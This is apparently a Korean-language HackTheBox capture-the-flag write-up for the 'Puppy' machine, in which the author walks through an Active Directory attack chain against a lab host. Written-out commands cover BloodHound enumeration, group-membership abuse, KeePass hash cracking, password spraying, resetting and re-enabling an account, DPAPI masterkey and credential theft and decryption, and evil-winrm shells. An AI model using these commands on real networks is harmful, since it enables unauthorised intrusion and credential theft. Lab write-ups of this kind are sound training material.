# Puppy - HackTheBox
## Recon
```bash
sudo nmap -p 111,135,139,2049,3260,3268,3269,389,445,464,49664,49667,49668,49676,53,593,5985,636,64949,64954,64970,88,9389 -sC -sV -vv -oA puppy 10.129.232.75
```
<img width="1202" height="529" alt="image" src="https://github.com/user-attachments/assets/f672988a-2b34-4476-a61b-9d2779d9859a" />

- KERBEROS(88)
- NFS(111)
- LDAP(389)
- SMB(445)
- WINRM(5985)

<br>

- `/etc/hosts`에 `puppy.htb` 추가.
<img width="1202" height="73" alt="image" src="https://github.com/user-attachments/assets/d688bfbf-fdf3-4b89-9e43-ee881531eaca" />

---
## Auth as ant.edwards
- `/etc/hosts`에 `dc` 추가.
<img width="1202" height="115" alt="image" src="https://github.com/user-attachments/assets/9d92585f-9d1f-44d3-9df0-430e02675002" />
<img width="1205" height="68" alt="image" src="https://github.com/user-attachments/assets/513e49b6-72ff-4620-88c7-423b09a29f1e" />

<br>
<br>

- 유저목록 수집.
```bash
nxc smb 10.129.232.75 -u levi.james -p KingofAkron2025! --users
```
<img width="1205" height="443" alt="image" src="https://github.com/user-attachments/assets/92911611-9948-42bb-9291-7b2becf364ce" />

<br>
<br>

- `bloodhound`를 사용.
- `developers` 그룹으로 `GenericWrite`권한 발견.
```bash
bloodhound-python -u levi.james -p KingofAkron2025! -d puppy.htb -c all --zip -ns 10.129.232.75
```
<img width="849" height="290" alt="image" src="https://github.com/user-attachments/assets/ce6c0bf0-5413-4fba-a280-da2d117d3097" />

<br>
<br>

- `levi.james`를 `developers` 그룹에 추가.
```bash
net rpc group addmem developers levi.james -U puppy.htb/levi.james%KingofAkron2025! -S 10.129.232.75

net rpc group members developers -U puppy.htb/levi.james%KingofAkron2025! -S 10.129.232.75
```
<img width="1204" height="207" alt="image" src="https://github.com/user-attachments/assets/b636ef65-d8fb-448c-96cf-7763bd23cf7c" />

<br>
<br>

- `developers` 그룹에 추가가 되어 이전에는 접근이 불가능 했던 `/dev`로 접근이 가능해짐.
<img width="1204" height="314" alt="image" src="https://github.com/user-attachments/assets/23b1ae0f-4699-4583-ac58-400162bfc91a" />

<br>
<br>

- `/dev`경로로 접속하여 내부 파일 다운로드.
```bash
smbclient -U levi.james //10.129.232.75/dev
```
<img width="1204" height="138" alt="image" src="https://github.com/user-attachments/assets/b5592529-3423-43eb-b2f5-5817e3ea7662" />

<br>
<br>

- `keepassxc`를 사용하여 내용확인 시도하니 비밀번호 요구.
<img width="679" height="312" alt="image" src="https://github.com/user-attachments/assets/38ce288a-aebc-414d-b65d-9de6496004da" />

<br>
<br>

- `keepass2john`으로 해시화 실패.
- `keepass2john`의 최신버전이 필요.
<img width="1204" height="83" alt="image" src="https://github.com/user-attachments/assets/77d54ffa-f3ee-41f0-8655-5ccb29dbbb64" />

<br>
<br>

- https://github.com/ivanmrsulja/keepass2john
- 최신버전을 사용하여 해시화.
```bash
python3 keepass2john.py ../recovery.kdbx > hash
```
<img width="1204" height="269" alt="image" src="https://github.com/user-attachments/assets/8df6dc99-61ec-4fae-86b6-48167e7f6022" />

<br>
<br>

- 크래킹 시도.
```bash
hashcat hash ~/util/rockyou.txt
```
<img width="1204" height="375" alt="image" src="https://github.com/user-attachments/assets/66645c37-aed5-460d-aedd-64c688300b2b" />

<br>
<br>

- `liverpool` 비밀번호 사용하여 접속.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/7129d4b9-7763-4798-bd06-31a64e55a5ab" />

<br>
<br>

- 모든 비밀번호 저장.
<img width="1204" height="162" alt="image" src="https://github.com/user-attachments/assets/20e3ee4d-6f30-4736-a065-3082bccd6e5e" />

<br>
<br>

- `ant.edwards:Antman2025!` 로그인 성공.
```bash
nxc smb 10.129.232.75 -u users -p passwords --continue-on-success
```
<img width="1204" height="354" alt="image" src="https://github.com/user-attachments/assets/7f4a41a1-6be9-45fb-8931-a35c96e974f0" />

---
## Shell as adam.silver
- bloodhound 사용.
- `adam.silver`유저로 `GenericAll`권한 발견.
```bash
bloodhound-python -u levi.james -p KingofAkron2025! -d puppy.htb -c all --zip -ns 10.129.232.75
```
<img width="770" height="270" alt="image" src="https://github.com/user-attachments/assets/53f19519-4fb3-4dee-bbc6-865b8bd7069e" />

<br>
<br>

- `adam.silver` 비밀번호 변경.
- 로그인 시도하였으나 활성화되어 있지 않은 상태.
```bash
net rpc password adam.silver 'newP@ssword2026' -U puppy.htb/ant.edwards%Antman2025! -S 10.129.232.75
```
<img width="1203" height="191" alt="image" src="https://github.com/user-attachments/assets/565d65bd-f89d-4591-87a9-ef5e5700b1fd" />

<br>
<br>

- 계정 활성화하여 로그인 시도.
```bash
bloodyAD -u ant.edwards -p 'Antman2025!' --host 10.129.232.75 -d puppy.htb remove uac -f ACCOUNTDISABLE adam.silver
```
<img width="1203" height="235" alt="image" src="https://github.com/user-attachments/assets/c7fbb575-1121-4889-b980-d8842397f9f0" />

<br>
<br>

- `winrm` 로그인 성공.
```bash
nxc winrm 10.129.232.75 -u adam.silver -p 'newP@ssword2026'
```
<img width="1203" height="189" alt="image" src="https://github.com/user-attachments/assets/018e5261-dfe0-4e0a-92cd-966eac85d227" />

<br>
<br>

- 셸 획득.
```bash
evil-winrm -i 10.129.232.75 -u adam.silver -p 'newP@ssword2026'
```
<img width="1203" height="287" alt="image" src="https://github.com/user-attachments/assets/ba9a46f8-0a87-417e-bbc5-dcb41015156e" />

---
## Shell as steph.cooper
- `c:\backups`에서 `site-backup-2024-12-30.zip` 발견.
<img width="1203" height="207" alt="image" src="https://github.com/user-attachments/assets/626321da-a5ae-4f03-90e2-f0fd1ffc0e12" />

<br>
<br>

- 로컬로 다운로드받아서 압축 해제.
- `/puppy`의 `nms-auth-config.xml.bak`에서 `steph.cooper`의 비밀번호 발견.
<img width="1203" height="225" alt="image" src="https://github.com/user-attachments/assets/2fe23e11-4504-42b6-8197-73856ef947d8" />

<br>
<br>

- `steph.cooper:ChefSteph2025!` 로그인.
```bash
nxc smb 10.129.232.75 -u steph.cooper -p ChefSteph2025!
```
<img width="1203" height="119" alt="image" src="https://github.com/user-attachments/assets/b4b733df-9029-4aef-95eb-376e47166143" />

<br>
<br>

- `winrm` 로그인 성공.
<img width="1203" height="178" alt="image" src="https://github.com/user-attachments/assets/80140479-74f8-4b6f-ad5d-a885961fba99" />

<br>
<br>

- 셸 획득.
```bash
evil-winrm -i 10.129.232.75 -u steph.cooper -p ChefSteph2025!
```
<img width="1203" height="286" alt="image" src="https://github.com/user-attachments/assets/f9ecd52f-6011-43f4-9df7-0092f6b28646" />

---
## Privesc
- 특별한 정보를 발견할 수 없어서 `winpeas`를 로컬로부터 다운로드 받아서 실행.
- DPAPI 데이터 발견
<img width="1203" height="603" alt="image" src="https://github.com/user-attachments/assets/4e0eda35-2911-4f61-8555-32e5cb4b7537" />

<br>
<br>

- 다운로드 시도하였으나 숨김파일 설정되어 있어 실패.
<img width="1203" height="409" alt="image" src="https://github.com/user-attachments/assets/b5e46246-31cd-4adf-a64b-434001e3e561" />

<br>
<br>

- 마스터키 및 자격 증명 파일들을 복사 후 숨김파일을 해제하여 로컬로 다운로드.
```
copy C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407 masterkey

copy C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D cred1

copy C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9 cred2

attrib -h -s masterkey

attrib -h -s cred1

attrib -h -s cred2

download masterkey

download cred1

download cred2
```
<img width="1202" height="183" alt="image" src="https://github.com/user-attachments/assets/94dd59df-e200-43de-a9bb-4447ba86fa63" />

<br>
<br>

- 사용자 비밀번호를 사용하여 마스터키 복호화.
```bash
impacket-dpapi masterkey -file masterkey -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password 'ChefSteph2025!'
```
<img width="1202" height="401" alt="image" src="https://github.com/user-attachments/assets/1a8b1733-5e58-40f9-906a-ab0496c61f73" />

<br>
<br>

- 복호화된 마스터키를 가지고 자격 증명 파일 복호화.
- `cred2`에서 `steph.cooper_adm`의 비밀번호 획득
```bash
impacket-dpapi credential -file cred2 -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```
<img width="1202" height="339" alt="image" src="https://github.com/user-attachments/assets/8aa93699-828c-4d61-9eac-9c09473a79ec" />

<br>
<br>

- `winrm`로그인 성공.
```bash
nxc winrm 10.129.232.75 -u steph.cooper_adm -p FivethChipOnItsWay2025!
```
<img width="1202" height="185" alt="image" src="https://github.com/user-attachments/assets/f164b65b-60de-4d44-9181-151c392d8422" />

<br>
<br>

- 셸획득.
```bash
evil-winrm -i 10.129.232.75 -u steph.cooper_adm -p FivethChipOnItsWay2025!
```
<img width="1202" height="291" alt="image" src="https://github.com/user-attachments/assets/bf3e568c-3a3b-4b6b-9ff8-3b6ff07da98f" />

---
## FLAG
- `c:\users\adam.silver\desktop\user.txt`
<img width="1202" height="228" alt="image" src="https://github.com/user-attachments/assets/25b054af-7a86-4a64-9677-5ad0dcff6237" />

<br>
<br>

- `c:\users\administrator\desktop\root.txt`
<img width="1202" height="202" alt="image" src="https://github.com/user-attachments/assets/8c1d6446-a27b-436e-bfa8-acf413d10e4c" />
